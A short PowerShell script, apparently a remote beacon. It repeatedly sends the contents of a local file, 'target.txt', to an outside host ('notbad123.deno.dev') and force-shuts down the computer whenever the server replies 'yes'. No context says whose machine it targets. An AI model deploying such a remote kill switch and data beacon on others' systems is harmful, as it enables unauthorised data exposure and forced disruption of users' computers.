$s = Get-Content "target.txt"

$url = "notbad123.deno.dev"

while ($true) {
    $res = Invoke-WebRequest -Uri $url -Method Get -Body "name=$s"
    Write-Output $res.Content
    if ($res.Content -eq "yes") {
        Stop-Computer -Force
    }
    Start-Sleep -Seconds 5
}